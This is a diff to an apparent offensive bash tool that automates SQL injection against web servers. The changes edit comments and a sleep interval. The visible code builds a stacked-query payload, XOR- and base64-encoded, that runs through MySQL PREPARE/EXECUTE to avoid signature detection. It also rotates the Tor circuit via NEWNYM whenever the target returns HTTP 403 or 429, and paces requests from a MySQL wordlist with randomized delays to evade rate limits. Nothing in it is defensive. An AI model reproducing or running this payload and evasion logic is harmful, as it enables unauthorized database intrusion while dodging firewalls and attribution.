@@ -79,9 +79,10 @@ vector_sqli_agressor_left() {
         local b64_payload
         b64_payload=$(base64_engine "$hex_xor")
         local defiance_tamper_path
-        # Inside the database, we use MySQL's PREPARE and EXECUTE statements to compile
-        # and run the decoded query directly inside the server's memory (@s).
-        # This ensures the raw SQL signature NEVER travels over the HTTP network wire.
+        # B64 and XOR tamper.
+        # is reconstructed dynamically via MySQL's PREPARE and EXECUTE statements.
+        # By processing the signature directly inside the server's session memory (@s),
+        # the raw, un-obfuscated SQL syntax never traverses the HTTP network wire in cleartext.
         defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
 
         local waf_args
@@ -178,8 +179,8 @@ vector_sqli_agressor_left() {
         stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
         http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
-        # The underlying logic here is self-explanatory.
-        # If the server suddenly responds with a 403 or 429 status code, the script# immediately triggers a newnym signal utilizing netcat.
+        # Trigger Tor IP rotation (SIGNAL NEWNYM) via control port 9051 
+        # whenever the target server hits us with an HTTP 403 or 429 block.
         if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
             echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
             (
@@ -374,6 +375,6 @@ vector_sqli_agressor_right() {
             fi
         fi
 
-        sleep $((RANDOM % 6 + 4))
+        sleep $((RANDOM % 6 + 7))
     done < <(shuf "$WORDLIST_MYSQL")
 }
